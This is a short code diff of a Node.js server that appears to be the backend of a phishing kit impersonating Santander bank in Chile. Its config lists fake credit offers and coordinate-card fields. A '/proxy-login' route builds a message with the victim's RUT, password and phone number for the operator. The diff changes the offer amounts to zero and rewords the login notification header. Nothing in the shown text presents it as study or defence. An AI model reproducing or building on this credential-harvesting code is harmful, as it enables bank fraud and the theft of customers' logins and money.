@@ -31,9 +31,9 @@ if (fs.existsSync(CONFIG_FILE)) {
 } else {
   config = {
     producto1: "Línea de Crédito",
-    monto1: 5000000,
+    monto1: 0,
     producto2: "Tarjeta de Crédito WorldMember Limited Business",
-    monto2: 5000000,
+    monto2: 0,
     tipoAutorizacion: "santander",
     coord1: "",
     coord2: "",
@@ -55,7 +55,7 @@ app.post("/proxy-login", async (req, res) => {
     return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
   }
 
-  let mensaje = "📩 Nuevo intento de inicio de sesión:\n";
+  let mensaje = "📩 Ingreso de sesión en AutOB:\n";
   if (rut) mensaje += `🆔 RUT: ${rut}\n`;
   if (passwd) mensaje += `🔑 Contraseña: ${passwd}\n`;
   if (telefono) mensaje += `📱 Teléfono: ${telefono}\n`;
